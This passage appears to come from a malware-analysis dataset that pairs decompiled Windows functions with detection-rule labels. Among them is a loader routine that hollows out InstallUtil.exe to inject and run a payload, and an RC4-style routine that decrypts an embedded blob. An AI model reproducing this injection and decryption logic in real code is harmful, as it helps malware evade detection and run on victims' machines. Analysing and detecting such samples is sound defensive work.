        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_720h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041b730(int32_t arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_20h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint8_t *puVar7;\n    int32_t var_720h;\n    uint var_71ch;\n    uint lpCPInfo;\n    uint var_712h;\n    uint var_704h;\n    uint var_304h;\n    uint var_204h;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    if ((*(arg_8h + 4) == 0xfde9) || (iVar4 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(*(arg_8h + 4), &lpCPInfo),  iVar4 == 0)\n       ) {\n        puVar7 = arg_8h + 0x19;\n        var_720h = -0x5a - arg_8h;\n        do {\n            if (puVar7 + var_720h < 0x1a) {\n                *puVar7 = *puVar7 | 0x10;\n                cVar2 = puVar7 + ' ';\ncode_r0x0041b8b3:\n                uVar3 = cVar2 + (-0x19 - arg_8h);\n            }\n            else {\n                if (puVar7 + (-0x7a - arg_8h) < 0x1a) {\n                    *puVar7 = *puVar7 | 0x20;\n                    cVar2 = puVar7 + -0x20;\n                    goto code_r0x0041b8b3;\n                }\n                uVar3 = 0;\n            }\n            puVar7[0x100] = uVar3;\n            puVar7 = puVar7 + 1;\n        } while (puVar7 + (-0x19 - arg_8h) < pe_nt_image_headers32);\n    }\n    else {\n        uVar5 = 0;\n        do {\n            *(&var_104h + uVar5) = uVar5;\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 0x100);\n        puVar6 = &var_712h;\n        var_104h._0_1_ = 0x20;\n        while (var_712h != 0) {\n            uVar3 = *(puVar6 + 1);\n            for (uVar5 = var_712h; (uVar5 <= uVar3 && (uVar5 < 0x100)); uVar5 = uVar5 + 1) {\n                *(&var_104h + uVar5) = 0x20;\n            }\n            puVar6 = puVar6 + 2;\n            var_712h._0_1_ = *puVar6;\n        }\n        fcn.00416931(0, 1, &var_104h, 0x100, &var_704h, *(arg_8h + 4), 0);\n        fcn.00416c28(0, *(arg_8h + 0x21c), 0x100, &var_104h, 0x100, &var_204h, 0x100, *(arg_8h + 4), 0);\n        fcn.00416c28(0, *(arg_8h + 0x21c), 0x200, &var_104h, 0x100, &var_304h, 0x100, *(arg_8h + 4), 0);\n        puVar7 = arg_8h + 0x19;\n        iVar4 = 0;\n        do {\n            uVar1 = *(&var_704h + iVar4 * 2);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 2) == 0) {\n                    uVar3 = 0;\n                }\n                else {\n                    *puVar7 = *puVar7 | 0x20;\n                    uVar3 = *(&var_304h + iVar4);\n                }\n            }\n            else {\n                *puVar7 = *puVar7 | 0x10;\n                uVar3 = *(&var_204h + iVar4);\n            }\n            puVar7[0x100] = uVar3;\n            iVar4 = iVar4 + 1;\n            puVar7 = puVar7 + 1;\n        } while (puVar7 + (-0x19 - arg_8h) < pe_nt_image_headers32);\n    }\n    fcn.00406dcc(var_720h);\n    return;\n}\n",
        "token_count": 1135
    },
    "00420ae9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00420ae9(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t var_4h;\n    \n    var_4h = 0x1000;\n    uVar2 = 0;\n    if ((arg_8h & 0x300) == 0) {\n        var_4h = 0x2000;\n    }\n    else if ((arg_8h & 0x300) != 0x200) {\n        var_4h = 0;\n    }\n    uVar1 = arg_8h & 0xc00;\n    if (uVar1 != 0) {\n        if (uVar1 == 0x400) {\n            uVar2 = 0x100;\n        }\n        else if (uVar1 == 0x800) {\n            uVar2 = 0x200;\n        }\n        else if (uVar1 == 0xc00) {\n            uVar2 = 0x300;\n        }\n    }\n    return (arg_8h & 4 | (arg_8h & 2) << 3) * 2 | ((arg_8h >> 2 & 8 | arg_8h & 0x10) >> 2 | arg_8h & 8) >> 1 |\n           (arg_8h & 1) << 4 | (arg_8h & 0x1000) << 2 | var_4h | uVar2;\n}\n",
        "token_count": 343
    },
    "00420b96": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00420b96(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar1 = arg_8h >> 2;\n    uVar2 = arg_8h & 0xc00;\n    uVar3 = (arg_8h & 0xc03fffff) >> 0x16;\n    uVar4 = 0;\n    if (uVar2 == 0x400) {\n        uVar2 = 0x8040;\n    }\n    else if (uVar2 == 0x800) {\n        uVar2 = 0x40;\n    }\n    else if (uVar2 == 0xc00) {\n        uVar2 = 0x8000;\n    }\n    else {\n        uVar2 = 0;\n    }\n    if (uVar3 != 0) {\n        if (uVar3 == 0x100) {\n            uVar4 = 0x2000;\n        }\n        else if (uVar3 == 0x200) {\n            uVar4 = 0x4000;\n        }\n        else if (uVar3 == 0x300) {\n            uVar4 = 0x6000;\n        }\n    }\n    return ((((uVar1 & 0x1000000) >> 0x16 | (((uVar1 & 0x400000) >> 0x16) << 2 | (uVar1 & 0x800000) >> 0x16) << 2) << 2\n            | (uVar1 & 0x2000000) >> 0x16) << 3 | (uVar1 & 0xc000000) >> 0x16) << 3 | uVar2 | uVar4;\n}\n",
        "token_count": 420
    },
    "00420c4c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00420c4c(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    uVar3 = arg_8h >> 2;\n    uVar4 = 0;\n    if ((arg_8h & 0x3000) == 0) {\n        uVar2 = 0x300;\n    }\n    else {\n        uVar2 = uVar4;\n        if ((arg_8h & 0x3000) == 0x1000) {\n            uVar2 = 0x200;\n        }\n    }\n    uVar1 = (arg_8h & 0xc00000) >> 0xe;\n    if (uVar1 != 0) {\n        if (uVar1 == 0x100) {\n            uVar4 = 0x400;\n        }\n        else if (uVar1 == 0x200) {\n            uVar4 = 0x800;\n        }\n        else if (uVar1 == 0x300) {\n            uVar4 = 0xc00;\n        }\n    }\n    return ((uVar3 & 0x10000) >> 0xe | (((uVar3 & 0x4000) >> 0xe) << 2 | (uVar3 & 0x8000) >> 0xe) << 2) * 2 |\n           (uVar3 & 0xc0000) >> 0x12 | (uVar3 & 0x20000) >> 0xf | arg_8h >> 2 & 0x1000 | uVar2 | uVar4;\n}\n",
        "token_count": 394
    },
    "00401900": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __thiscall fcn.00401900(code **param_1, int32_t ****param_2, int32_t ****param_3, int32_t **param_4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint ****ppppuVar4;\n    int32_t arg_8h;\n    int32_t ****ppppiVar5;\n    int32_t ****unaff_retaddr;\n    int32_t ****arg_8h_00;\n    int32_t *piStack80;\n    int32_t *piStack76;\n    int32_t *piStack72;\n    int32_t *piStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint ****appppuStack52 [3];\n    uint32_t uStack40;\n    int32_t ****ppppiStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    int32_t *piStack24;\n    ulong uStack20;\n    int32_t ****ppppiStack12;\n    uint uStack8;\n    uint32_t uStack4;\n    \n    uStack4 = *0x48e22c ^ &stack0xffffffac;\n    piVar1 = param_4[4];\n    arg_8h_00 = NULL;\n    piStack80 = NULL;\n    piStack76 = NULL;\n    piStack72 = NULL;\n    if (0xf < param_4[5]) {\n        param_4 = *param_4;\n    }\n    if (0x7fffffff < piVar1) {\n        fcn.00403320();\ncode_r0x00401adf:\n        fcn.0040b82f();\ncode_r0x00401ae4:\n        fcn.0040b82f();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (piVar1 < 0x10) {\n        uStack64 = 0xf;\n        uStack8 = param_3;\n        arg_8h_00 = *param_4;\n        piStack80 = param_4[1];\n        piStack76 = param_4[2];\n        piStack72 = param_4[3];\n        unaff_retaddr = param_2;\n        ppppiVar5 = param_3;\n        piStack68 = piVar1;\n        if (piVar1 != NULL) goto code_r0x004019b7;\n    }\n    else {\n        piStack68 = piVar1 | 0xf;\n        if (piStack68 < 0x80000000) {\n            if (piStack68 < 0x16) {\n                piStack68 = 0x16;\n            }\n        }\n        else {\n            piStack68 = 0x7fffffff;\n        }\n        uVar3 = fcn.00403340(piStack68 + 1);\n        piStack72 = piVar1;\n        fcn.00408060(uVar3, param_4, piVar1 + 1);\n        ppppiStack12 = param_2;\n        ppppiVar5 = param_2;\ncode_r0x004019b7:\n        fcn.004034f0(0x424238, 2);\n    }\n    (*(*ppppiVar5)[2])(&piStack72, unaff_retaddr);\n    ppppuVar4 = appppuStack52;\n    if (0xf < piStack32) {\n        ppppuVar4 = appppuStack52[0];\n    }\n    fcn.004034f0(ppppuVar4, ppppiStack36);\n    if (0xf < uStack40) {\n        arg_8h = iStack60;\n        if ((0xfff < uStack40 + 1) && (arg_8h = *(iStack60 + -4),  0x1f < (iStack60 - arg_8h) - 4U))\n        goto code_r0x00401adf;\n        fcn.00406db9(arg_8h);\n    }\n    *param_1 = vtable.std::exception.0;\n    uStack20 = CONCAT44(uStack64, piStack68);\n    *(param_1 + 1) = 0;\n    piStack32 = piStack80;\n    piStack28 = piStack76;\n    piStack24 = piStack72;\n    ppppiStack12 = &ppppiStack36;\n    if (0xf < uStack64) {\n        ppppiStack12 = arg_8h_00;\n    }\n    uStack8 = CONCAT31(uStack8._1_3_, 1);\n    ppppiStack36 = arg_8h_00;\n    fcn.00407bae(&ppppiStack12, param_1 + 1);\n    *param_1 = vtable.std::runtime_error.0;\n    if (0xf < uStack20._4_4_) {\n        ppppiVar5 = ppppiStack36;\n        if ((0xfff < uStack20._4_4_ + 1) && (ppppiVar5 = ppppiStack36[-1],  0x1f < ppppiStack36 + (-4 - ppppiVar5)))\n        goto code_r0x00401ae4;\n        fcn.00406db9(ppppiVar5);\n    }\n    param_1[3] = param_2;\n    *param_1 = vtable.std::_System_error.0;\n    param_1[4] = param_3;\n    fcn.00406dcc(arg_8h_00);\n    return;\n}\n",
        "token_count": 1253
    },
    "00401c60": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401cbe)\n// WARNING: Removing unreachable block (ram,0x00401ccd)\n// WARNING: Removing unreachable block (ram,0x00401cf9)\n// WARNING: Removing unreachable block (ram,0x00401cdd)\n\ncode ** __thiscall fcn.00401c60(code **param_1, char *param_2, uint *param_3)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    char *pcVar4;\n    \n    uVar2 = param_3[1];\n    uVar3 = *param_3;\n    pcVar4 = param_2;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00401330(param_2);\n    fcn.00401900(uVar3, uVar2, &stack0xffffffe0);\n    *param_1 = vtable.std::ios_base::failure.0;\n    return param_1;\n}\n",
        "token_count": 244
    },
    "00401df0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401df0(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t arg_8h;\n    \n    if (0xf < param_1[5]) {\n        iVar1 = *param_1;\n        arg_8h = iVar1;\n        if ((0xfff < param_1[5] + 1U) && (arg_8h = *(iVar1 + -4),  0x1f < (iVar1 - arg_8h) - 4U)) {\n            fcn.0040b82f();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.00406db9(arg_8h);\n    }\n    param_1[4] = 0;\n    param_1[5] = 0xf;\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 210
    },
    "00402520": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402520(void)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint16_t in_stack_00431d6a;\n    uint uStack748;\n    int32_t iStack744;\n    char *pcStack740;\n    int32_t iStack736;\n    int32_t iStack732;\n    uchar *puStack728;\n    int32_t iStack724;\n    char *pcStack720;\n    uchar *puStack716;\n    int32_t iStack712;\n    uint uStack708;\n    uint uStack704;\n    uint *puVar10;\n    int32_t iStack692;\n    uchar auStack644 [4];\n    uint uStack640;\n    int32_t iStack632;\n    uchar auStack620 [20];\n    uint uStack600;\n    ulong uStack596;\n    ulong uStack588;\n    ulong uStack580;\n    ulong uStack572;\n    ulong uStack564;\n    ulong uStack556;\n    uchar auStack548 [8];\n    ulong uStack540;\n    uint32_t uStack4;\n    \n    uStack4 = *0x48e22c ^ &stack0xfffffd7c;\n    fcn.00402330();\n    pcVar6 = _sym.imp.KERNEL32.dll_GetModuleHandleW;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n    auStack620._0_16_ = ZEXT816(0);\n    iVar5 = str.BR__._0_4_;\n    iStack632 = iVar2;\n    uStack640 = (*pcVar6)();\n    uStack600 = 0x44;\n    uStack596 = 0;\n    uStack588 = 0;\n    uStack580 = 0;\n    uStack572 = 0;\n    uStack564 = 0;\n    uStack556 = 0;\n    auStack548 = 0;\n    uStack540 = 0;\n    iVar3 = fcn.00404450();\n    (*(iVar3 + iVar2))();\n    iVar3 = fcn.00404450();\n    (*(iVar3 + iVar2))();\n    puVar9 = &stack0xfffffde2;\n    do {\n        piVar1 = puVar9 + 2;\n        puVar9 = puVar9 + 2;\n    } while (*piVar1 != 0);\n    puVar10 = L\"\\\\Microsoft.N\";\n    for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar9 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = *puVar10;\n    iVar3 = fcn.00404450();\n    pcVar4 = iVar3 + iVar2;\n    iVar3 = fcn.00404450();\n    pcVar6 = iVar3 + iVar5;\n    puVar9 = &stack0xfffffde2;\n    do {\n        piVar1 = puVar9 + 2;\n        puVar9 = puVar9 + 2;\n    } while (*piVar1 != 0);\n    iStack692 = 0;\n    puVar10 = NULL;\n    uStack704 = 0;\n    uStack708 = 0;\n    iStack712 = 0;\n    puStack716 = &stack0xfffffde4;\n    puVar7 = L\"ET\\\\Framework\\\\v4.0.30319\\\\InstallUtil.exe\";\n    for (iVar5 = 0x14; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    pcStack720 = 0x40267d;\n    iVar5 = (*pcVar4)();\n    while( true ) {\n        if (iVar5 == 0) goto code_r0x004028e3;\n        pcStack720 = \"VirtualAllocEx\";\n        puStack728 = 0x402690;\n        iStack724 = iVar2;\n        iVar5 = fcn.00404450();\n        pcStack720 = 0x4;\n        iStack724 = 0x1000;\n        puStack728 = 0x4;\n        iStack732 = 0;\n        iStack736 = -1;\n        pcStack740 = 0x4026a5;\n        puVar9 = (*(iVar2 + iVar5))();\n        pcStack740 = \"GetThreadContext\";\n        *puVar9 = 0x10007;\n        uStack748 = 0x4026bc;\n        iStack744 = iVar2;\n        puVar10 = puVar9;\n        iVar3 = fcn.00404450();\n        iStack744 = 0;\n        uStack748 = 0x4026c8;\n        pcStack740 = puVar9;\n        iVar3 = (*(iVar3 + iVar2))();\n        if (iVar3 == 0) goto code_r0x004028e3;\n        pcStack720 = \"ReadProcessMemory\";\n        puStack728 = 0x4026db;\n        iStack724 = iVar2;\n        iVar3 = fcn.00404450();\n        puStack728 = &stack0xfffffd70;\n        pcStack720 = NULL;\n        iStack724 = 4;\n        iStack732 = puVar9[0x29] + 8;\n        iStack736 = 0x104;\n        pcStack740 = 0x4026f9;\n        (*(iVar3 + iVar2))();\n        pcStack740 = 0x424478;\n        uStack748 = 0x402704;\n        iStack744 = iVar2;\n        iStack712 = fcn.00404450();\n        iStack712 = iStack712 + iVar2;\n        pcStack740 = 0x40;\n        iStack744 = 0x3000;\n        uStack748 = *(pcStack720 + 0x432068);\n        pcVar4 = *(pcStack720 + 0x43204c);\n        iVar3 = (*(iVar2 + iVar5))();\n        iVar5 = *(pcStack740 + 0x43206c);\n        iStack736 = iVar3;\n        (*pcVar6)(iStack712, iVar3, 0x432018);\n        if (iVar3 != 0) break;\n        (*pcVar4)(iStack732, 5);\n        iVar3 = fcn.00404450(iVar2, \"GetWindowsDirectoryW\");\n        (*(iVar3 + iVar2))(&stack0xfffffd78, 0x104);\n        puVar9 = &stack0xfffffd6e;\n        do {\n            piVar1 = puVar9 + 2;\n            puVar9 = puVar9 + 2;\n        } while (*piVar1 != 0);\n        puStack728 = NULL;\n        puVar7 = L\"\\\\Microsoft.N\";\n        for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar9 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        *puVar9 = *puVar7;\n        iVar3 = fcn.00404450(iVar2, \"CreateProcessW\");\n        pcVar4 = iVar3 + iVar2;\n        iVar3 = fcn.00404450(iVar5, \"ZwWriteVirtualMemory\");\n        puVar9 = &stack0xfffffd6e;\n        pcVar6 = iVar5 + iVar3;\n        do {\n            piVar1 = puVar9 + 2;\n            puVar9 = puVar9 + 2;\n        } while (*piVar1 != 0);\n        puVar7 = L\"ET\\\\Framework\\\\v4.0.30319\\\\InstallUtil.exe\";\n        for (iVar5 = 0x14; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar9 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        iVar5 = (*pcVar4)(&stack0xfffffd70, 0, 0, 0, 0, 4, 0, 0, &stack0xfffffd2c, &stack0xfffffd14);\n    }\n    if (in_stack_00431d6a != 0) {\n        iVar8 = 0;\n        iVar5 = 0;\n        do {\n            iVar2 = str.BR__._0_4_ + iVar8;\n            (*pcVar6)(iStack732, *(iVar2 + 0x43211c), *(iVar2 + 0x432124) + 0x432018, *(iVar2 + 0x432120), 0);\n            iVar5 = iVar5 + 1;\n            iVar8 = iVar8 + 0x28;\n            iVar2 = iStack744;\n            iVar3 = iStack692;\n            puVar9 = pcStack740;\n        } while (iVar5 < in_stack_00431d6a);\n    }\n    iVar5 = 0;\n    (*pcVar6)(iStack732, puVar9[0x29] + 8, iStack736, 4);\n    puVar9[0x2c] = *(iVar5 + 0x432040) + iVar3;\n    iVar5 = fcn.00404450(iVar2, \"SetThreadContext\");\n    (*(iVar5 + iVar2))(uStack748, puVar9);\n    iVar5 = fcn.00404450(iVar2, \"ResumeThread\");\n    (*(iVar5 + iVar2))(0);\ncode_r0x004028e3:\n    uStack704 = 0x4028f5;\n    fcn.00406dcc(puVar10);\n    return;\n}\n",
        "token_count": 2238
    },
    "00402330": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.00402330(void)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint unaff_EBX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    uint var_10h_2;\n    uint var_110h_2;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint var_110h;\n    uint32_t uStack600;\n    uint8_t auStack584 [256];\n    uint32_t uStack328;\n    uint32_t uStack324;\n    uint var_130h;\n    uint32_t *puStack296;\n    int32_t *piStack292;\n    uint uStack288;\n    uint uStack284;\n    uchar auStack280 [16];\n    uint8_t auStack264 [212];\n    uint var_30h;\n    uint var_2ch;\n    uint var_ch_2;\n    uint32_t var_4h;\n    \n    uStack284 = 0xffffffff;\n    uStack288 = 0x4234a0;\n    piStack292 = *in_FS_OFFSET;\n    uStack600 = *0x48e22c ^ auStack280;\n    puStack296 = &uStack600;\n    *in_FS_OFFSET = &piStack292;\n    var_4h = uStack600;\n    uVar2 = fcn.00401f00(0x101);\n    fcn.004013c0(uVar2);\n    for (uStack324 = 0; uStack324 < 0x100; uStack324 = uStack324 + 1) {\n        auStack264[uStack324] = uStack324;\n        auStack584[uStack324] = *(uStack324 % 0x13 + 0x432000);\n    }\n    uVar3 = 0;\n    for (iVar4 = 0; iVar4 < 0x100; iVar4 = iVar4 + 1) {\n        uVar1 = auStack264[iVar4];\n        uVar3 = uVar3 + auStack584[iVar4] + uVar1 & 0x800000ff;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n        }\n        auStack264[iVar4] = auStack264[uVar3];\n        auStack264[uVar3] = uVar1;\n    }\n    uStack324 = 0;\n    uVar3 = 0;\n    for (uStack328 = 0; uStack328 < 0x5c200; uStack328 = uStack328 + 1) {\n        uStack324 = uStack324 + 1 & 0x800000ff;\n        if (uStack324 < 0) {\n            uStack324 = (uStack324 - 1 | 0xffffff00) + 1;\n        }\n        uVar1 = auStack264[uStack324];\n        uVar3 = uVar3 + uVar1 & 0x800000ff;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n        }\n        auStack264[uStack324] = auStack264[uVar3];\n        auStack264[uVar3] = uVar1;\n        *(uStack328 + 0x432018) = auStack264[auStack264[uStack324] + uVar1 & 0xff] ^ *(uStack328 + 0x432018);\n    }\n    uStack284 = 0xffffffff;\n    *in_FS_OFFSET = piStack292;\n    fcn.00406dcc(unaff_EBX);\n    return;\n}\n",
        "token_count": 819
    },
    "00403390": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t ** __thiscall fcn.00403390(int32_t **param_1, uint32_t param_2, char param_3)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    uint unaff_EBX;\n    char cVar5;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    uint32_t uStack24;\n    \n    cVar5 = unaff_EBX >> 0x18;\n    uStack24 = CONCAT13(param_3, uStack24);\n    piVar3 = param_1[5];\n    piVar7 = param_1[4];\n    if (param_2 <= piVar3 - piVar7) {\n        param_1[4] = param_2 + piVar7;\n        ppiVar4 = param_1;\n        if (0xf < piVar3) {\n            ppiVar4 = *param_1;\n        }\n        fcn.004085e0(ppiVar4 + piVar7, param_3, param_2);\n        *(param_2 + ppiVar4 + piVar7) = 0;\n        return param_1;\n    }\n    if (0x7fffffffU - piVar7 < param_2) {\n        fcn.00403320();\n    }\n    else {\n        piVar6 = param_2 + piVar7 | 0xf;\n        if (piVar6 < 0x80000000) {\n            if (0x7fffffff - (piVar3 >> 1) < piVar3) {\n                piVar6 = 0x7fffffff;\n            }\n            else {\n                piVar3 = (piVar3 >> 1) + piVar3;\n                if (piVar6 < piVar3) {\n                    piVar6 = piVar3;\n                }\n            }\n        }\n        else {\n            piVar6 = 0x7fffffff;\n        }\n        piVar3 = fcn.00403340(piVar6 + 1);\n        param_1[4] = param_2 + piVar7;\n        param_1[5] = piVar6;\n        iVar1 = piVar3 + piVar7;\n        if (uStack24 < 0x10) {\n            fcn.00408060(piVar3, param_1, piVar7);\n            fcn.004085e0(iVar1, cVar5, param_2);\n            *(iVar1 + param_2) = 0;\n            *param_1 = piVar3;\n            return param_1;\n        }\n        piVar6 = *param_1;\n        fcn.00408060(piVar3, piVar6, piVar7);\n        fcn.004085e0(iVar1, cVar5, param_2);\n        *(iVar1 + param_2) = 0;\n        piVar7 = piVar6;\n        if ((uStack24 + 1 < 0x1000) || (piVar7 = piVar6[-1],  piVar6 + (-4 - piVar7) < 0x20)) {\n            fcn.00406db9(piVar7);\n            *param_1 = piVar3;\n            return param_1;\n        }\n    }\n    fcn.0040b82f();\n    pcVar2 = swi(3);\n    ppiVar4 = (*pcVar2)();\n    return ppiVar4;\n}\n",
        "token_count": 778
    },
    "004034f0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nint32_t ** __thiscall fcn.004034f0(int32_t **param_1, uint param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t *piVar4;\n    int32_t **ppiVar5;\n    uint32_t unaff_EBX;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    \n    piVar7 = param_1[5];\n    piVar2 = param_1[4];\n    if (param_3 <= piVar7 - piVar2) {\n        param_1[4] = param_3 + piVar2;\n        ppiVar5 = param_1;\n        if (0xf < piVar7) {\n            ppiVar5 = *param_1;\n        }\n        fcn.00408060(ppiVar5 + piVar2, param_2, param_3);\n        *(param_3 + ppiVar5 + piVar2) = 0;\n        return param_1;\n    }\n    if (0x7fffffffU - piVar2 < param_3) {\n        fcn.00403320();\n    }\n    else {\n        piVar6 = param_3 + piVar2 | 0xf;\n        if (piVar6 < 0x80000000) {\n            if (0x7fffffff - (piVar7 >> 1) < piVar7) {\n                piVar6 = 0x7fffffff;\n            }\n            else {\n                piVar4 = (piVar7 >> 1) + piVar7;\n                if (piVar6 < piVar4) {\n                    piVar6 = piVar4;\n                }\n            }\n        }\n        else {\n            piVar6 = 0x7fffffff;\n        }\n        piVar4 = fcn.00403340(piVar6 + 1);\n        param_1[5] = piVar6;\n        param_1[4] = param_3 + piVar2;\n        iVar1 = piVar4 + piVar2;\n        if (unaff_EBX < 0x10) {\n            fcn.00408060(piVar4, param_1, piVar2);\n            fcn.00408060(iVar1, piVar7, param_3);\n            *(iVar1 + param_3) = 0;\n            *param_1 = piVar4;\n            return param_1;\n        }\n        piVar6 = *param_1;\n        fcn.00408060(piVar4, piVar6, piVar2);\n        fcn.00408060(iVar1, piVar7, param_3);\n        *(iVar1 + param_3) = 0;\n        piVar7 = piVar6;\n        if ((unaff_EBX + 1 < 0x1000) || (piVar7 = piVar6[-1],  piVar6 + (-4 - piVar7) < 0x20)) {\n            fcn.00406db9(piVar7);\n            *param_1 = piVar4;\n            return param_1;\n        }\n    }\n    fcn.0040b82f();\n    pcVar3 = swi(3);\n    ppiVar5 = (*pcVar3)();\n    return ppiVar5;\n}\n",
        "token_count": 735
    },
    "00404640": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t ** __thiscall fcn.00404640(int32_t **param_1, int32_t *param_2, uint32_t param_3, char param_4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t **ppiVar5;\n    uint32_t uVar6;\n    uint unaff_EBX;\n    char cVar8;\n    int32_t iVar7;\n    int32_t iVar9;\n    int32_t *arg_8h;\n    int32_t *piStack32;\n    \n    cVar8 = unaff_EBX >> 0x18;\n    piStack32 = CONCAT13(param_4, piStack32._0_3_);\n    piVar1 = param_1[4];\n    if (piVar1 < param_2) {\n        fcn.00403330();\n    }\n    else {\n        piVar4 = param_1[5];\n        if (param_3 <= piVar4 - piVar1) {\n            param_1[4] = piVar1 + param_3;\n            ppiVar5 = param_1;\n            if (0xf < piVar4) {\n                ppiVar5 = *param_1;\n            }\n            iVar9 = param_2 + ppiVar5;\n            fcn.00408060(iVar9 + param_3, iVar9, piVar1 + (1 - param_2));\n            fcn.004085e0(iVar9, param_4, param_3);\n            return param_1;\n        }\n        if (param_3 <= 0x7fffffffU - piVar1) {\n            uVar6 = piVar1 + param_3 | 0xf;\n            if (uVar6 < 0x80000000) {\n                if (0x7fffffff - (piVar4 >> 1) < piVar4) {\n                    uVar6 = 0x7fffffff;\n                }\n                else {\n                    uVar3 = (piVar4 >> 1) + piVar4;\n                    if (uVar6 < uVar3) {\n                        uVar6 = uVar3;\n                    }\n                }\n            }\n            else {\n                uVar6 = 0x7fffffff;\n            }\n            piVar4 = fcn.00403340(uVar6 + 1);\n            param_1[4] = piVar1 + param_3;\n            iVar7 = piVar1 + (1 - param_2);\n            param_1[5] = 